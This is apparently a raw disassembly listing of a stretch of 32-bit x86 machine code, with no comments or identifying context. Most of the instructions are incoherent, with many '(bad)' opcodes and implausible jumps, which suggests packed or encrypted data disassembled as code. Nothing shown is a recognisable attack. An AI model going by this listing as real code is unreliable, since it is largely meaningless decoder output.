  40de7a:	sub    DWORD PTR [edi-0x9],esi
  40de7d:	mov    dl,0xd9
  40de7f:	jne    0x40de0e
  40de81:	ss aam 0x6
  40de84:	retf   
  40de85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de86:	add    eax,DWORD PTR [ebp+0x2c]
  40de89:	and    ebp,DWORD PTR [ebp-0x17b089b3]
  40de8f:	mov    eax,ds:0x15e87d24
  40de94:	sub    BYTE PTR [ebx-0x799d5784],bh
  40de9a:	mov    cl,BYTE PTR [ecx+eax*2-0x6a]
  40de9e:	int3   
  40de9f:	ficomp DWORD PTR [edx+ebp*8+0x9]
  40dea3:	push   ss
  40dea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dea5:	retf   
  40dea6:	popa   
  40dea7:	stc    
  40dea8:	xchg   edx,eax
  40dea9:	jnp    0x40deef
  40deab:	jge    0x40de9f
  40dead:	dec    esp
  40deae:	outs   dx,BYTE PTR ds:[esi]
  40deaf:	adc    esp,DWORD PTR [ebx-0xa50f858]
  40deb5:	pop    ebx
  40deb6:	test   edi,ebx
  40deb8:	push   edx
  40deb9:	jge    0x40ded9
  40debb:	not    BYTE PTR [ebx]
  40debd:	stos   BYTE PTR es:[edi],al
  40debe:	or     ecx,DWORD PTR [ecx+0x72846c70]
  40dec4:	add    DWORD PTR [ebp+0x76],ecx
  40dec7:	sub    DWORD PTR [esp+eax*4],edi
  40deca:	repz aaa 
  40decc:	jne    0x40debe
  40dece:	dec    ebp
  40decf:	out    0xec,eax
  40ded1:	add    cl,dl
  40ded3:	xchg   esi,eax
  40ded4:	dec    eax
  40ded5:	inc    edx
  40ded6:	loope  0x40df03
  40ded8:	fsubr  QWORD PTR [esi+0x1cd8d75a]
  40dede:	dec    esi
  40dedf:	xchg   edi,eax
  40dee0:	push   cs
  40dee1:	mov    edi,0x947f64d4
  40dee6:	adc    al,0xf2
  40dee8:	inc    esi
  40dee9:	push   ebp
  40deea:	mov    al,es:0xaf6d2f21
  40def0:	mov    edx,0xdac2785b
  40def5:	frstor [edx-0x13288572]
  40defb:	xor    dh,ch
  40defd:	jge    0x40def2
  40deff:	fdiv   QWORD PTR [ebx]
  40df01:	inc    edx
  40df02:	mov    cl,0xa7
  40df04:	retf   
  40df05:	js     0x40df67
  40df07:	nop
  40df08:	xor    ecx,DWORD PTR [esi-0x7d28102f]
  40df0e:	(bad)  [ecx]
  40df10:	xchg   esi,eax
  40df11:	cdq    
  40df12:	cli    
  40df13:	outs   dx,DWORD PTR ds:[esi]
  40df14:	icebp  
  40df15:	adc    eax,0x96abed34
  40df1a:	jecxz  0x40def2
  40df1c:	push   es
  40df1d:	add    ecx,edx
  40df1f:	cmp    eax,0x4397c8b6
  40df24:	fwait
  40df25:	mov    edi,0x9e99d80b
  40df2a:	push   edx
  40df2b:	mov    ecx,0x1b2d23e7
  40df30:	addr16 ret 
  40df32:	(bad)  
  40df33:	pop    eax
  40df34:	test   al,0x84
  40df36:	dec    ebp
  40df37:	aas    
  40df38:	daa    
  40df39:	push   0xffffff92
  40df3b:	in     al,dx
  40df3c:	inc    edi
  40df3d:	pop    ds
  40df3e:	sub    edi,edx
  40df40:	add    BYTE PTR ds:0x30a1ff,ah
  40df46:	cli    
  40df47:	call   0xfa10c13b
  40df4c:	sub    eax,0xe86b71f9
  40df51:	sbb    DWORD PTR [esi-0x5c],ebx
  40df54:	mov    eax,0x38b04c72
  40df59:	ret    
  40df5a:	pop    es
  40df5b:	sar    DWORD PTR ds:0x26366dad,cl
  40df61:	es bnd jb 0x40df25
  40df65:	jae    0x40df1b
  40df67:	sbb    dh,bh
  40df69:	sub    al,0x94
  40df6b:	dec    ecx
  40df6c:	js     0x40dfe1
  40df6e:	add    ebx,DWORD PTR [edx+0x2af2b85]
  40df74:	imul   edx,DWORD PTR [ebp-0x7826d4d6],0x458b49cb
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shr    edx,1
  40dfa8:	jge    0x40df66
  40dfaa:	xchg   edi,eax
  40dfab:	xchg   DWORD PTR [edi+0x7f3f7e7e],eax
  40dfb1:	jle    0x40e031
  40dfb3:	iret   
  40dfb4:	ss pop ss
  40dfb6:	(bad)  
  40dfb7:	sub    eax,0xf04d14f2
  40dfbc:	data16 loopne 0x40df55
  40dfbf:	aam    0x41
  40dfc1:	mov    ebp,0x4492cb61
  40dfc6:	pop    eax
  40dfc7:	push   cs
  40dfc8:	inc    edi
  40dfc9:	mov    esp,0xc1ee64f6
  40dfce:	mov    cs,eax
  40dfd0:	clc    
  40dfd1:	push   ebx
  40dfd2:	cmp    ebx,esi
  40dfd4:	xchg   esi,eax
  40dfd5:	jmp    0x40dfa8
  40dfd7:	js     0x40df7f
  40dfd9:	nop
  40dfda:	dec    eax
  40dfdb:	repnz test eax,0x7ffb950a
  40dfe1:	int    0xe
  40dfe3:	jo     0x40dfbf
  40dfe5:	out    0xa1,eax
  40dfe7:	inc    ebp
  40dfe8:	mov    ah,BYTE PTR [edx+0x83218eb]
  40dfee:	pusha  
  40dfef:	mov    bl,al
  40dff1:	push   0xffffff98
  40dff3:	sahf   
  40dff4:	push   ebx
  40dff5:	xchg   ecx,eax
  40dff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff7:	lock inc esp
  40dff9:	push   edx
  40dffa:	jle    0x40dfb3
  40dffc:	xchg   edi,eax
  40dffd:	sti    
  40dffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfff:	add    bl,BYTE PTR [edi-0x43487208]
  40e005:	dec    ebp
  40e006:	mov    dl,0xc8
  40e008:	scas   eax,DWORD PTR es:[edi]
  40e009:	stos   DWORD PTR es:[edi],eax
  40e00a:	repnz sbb edx,DWORD PTR [edi+0x223f31f3]
  40e011:	retf   0x583f
  40e014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e015:	cwde   
  40e016:	dec    ebp
  40e017:	maskmovq mm2,(bad)
  40e018:	not    DWORD PTR [edx+0x1b81932b]
  40e01e:	xchg   edi,eax
  40e01f:	jp     0x40dfae
  40e021:	fwait
  40e022:	popf   
  40e023:	cli    
  40e024:	mov    esp,DWORD PTR [ecx]
  40e026:	push   es
  40e027:	call   0xe8bab2d5
  40e02c:	pop    eax
  40e02d:	fwait
  40e02e:	lods   al,BYTE PTR ds:[esi]
  40e02f:	jae    0x40dfc8
  40e031:	fbld   TBYTE PTR [ebx]
  40e033:	or     eax,0xba3cffdf
  40e038:	jb     0x40e051
  40e03a:	push   es
  40e03b:	imul   esi,DWORD PTR [edx+ebx*1-0x6431de88],0xa1bc98f7
  40e046:	hlt    
  40e047:	push   ss
  40e048:	pop    eax
  40e049:	xchg   edi,eax
  40e04a:	push   es
  40e04b:	pusha  
  40e04c:	leave  
  40e04d:	jmp    0x40e0b9
  40e04f:	js     0x40dfd7
  40e051:	or     BYTE PTR [edx],0x97
  40e054:	shld   DWORD PTR ds:0xc3c8f6fd,esi,0x94
  40e05c:	mov    BYTE PTR [eax],0x95
  40e05f:	bswap  ebx
  40e061:	inc    esi
  40e062:	outs   dx,DWORD PTR fs:[esi]
  40e064:	jmp    0x5ebec836
  40e069:	and    al,0x4f
  40e06b:	mov    ss,WORD PTR [ecx+0x199e0cee]
  40e071:	inc    eax
  40e072:	test   eax,0xa955f163
  40e077:	or     DWORD PTR [ebp+0x6e],ebx
  40e07a:	aam    0x3a
  40e07c:	jmp    0x64f2d50
  40e081:	add    eax,0xe17f9b49
  40e086:	bound  edi,QWORD PTR [eax+edi*4-0x7bd8f2a0]
  40e08d:	outs   dx,DWORD PTR ds:[esi]
  40e08e:	mov    ebx,0x7ac9a5ee
  40e093:	or     esi,DWORD PTR [ecx]
  40e095:	pop    ecx
  40e096:	sbb    edx,DWORD PTR [edx]
  40e098:	fld    QWORD PTR [esi]
  40e09a:	das    
  40e09b:	call   FWORD PTR [eax+0x6a]
  40e09e:	clc    
  40e09f:	sub    al,0x22
  40e0a1:	ds cdq 
  40e0a3:	jne    0x40e041
  40e0a5:	cmp    BYTE PTR [ebp+0x4b],ah
  40e0a8:	inc    esi
  40e0a9:	outs   dx,BYTE PTR ds:[esi]
  40e0aa:	rol    BYTE PTR [ecx],cl
  40e0ac:	ret    
  40e0ad:	lahf   
  40e0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0af:	pop    ebp
  40e0b0:	sbb    cl,BYTE PTR [edi-0x1e]
  40e0b3:	xor    al,ch
  40e0b5:	imul   esp,DWORD PTR [esi+esi*8],0xe4d19365
  40e0bc:	je     0x40e121
  40e0be:	dec    ebx
  40e0bf:	(bad)  
  40e0c0:	ins    DWORD PTR es:[edi],dx
  40e0c1:	pcmpgtb mm2,mm5
  40e0c4:	repz lahf 
  40e0c6:	pop    esi
  40e0c7:	jmp    0x9bccc790
  40e0cc:	fnsetpm(287 only) 
  40e0ce:	in     eax,0x6f
  40e0d0:	mov    dh,0x3f
  40e0d2:	jle    0x40e12c
  40e0d4:	pop    esi
  40e0d5:	adc    al,0xfe
  40e0d7:	fild   QWORD PTR [esi+0x44efa883]
  40e0dd:	fdiv   DWORD PTR [ebp+0x17ed347b]
  40e0e3:	or     BYTE PTR [ecx-0xddcba8c],bl
  40e0e9:	mov    eax,ds:0xffd05bcf
  40e0ee:	js     0x40e08d
  40e0f0:	test   dh,ch
  40e0f2:	push   eax
  40e0f3:	scas   al,BYTE PTR es:[edi]
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
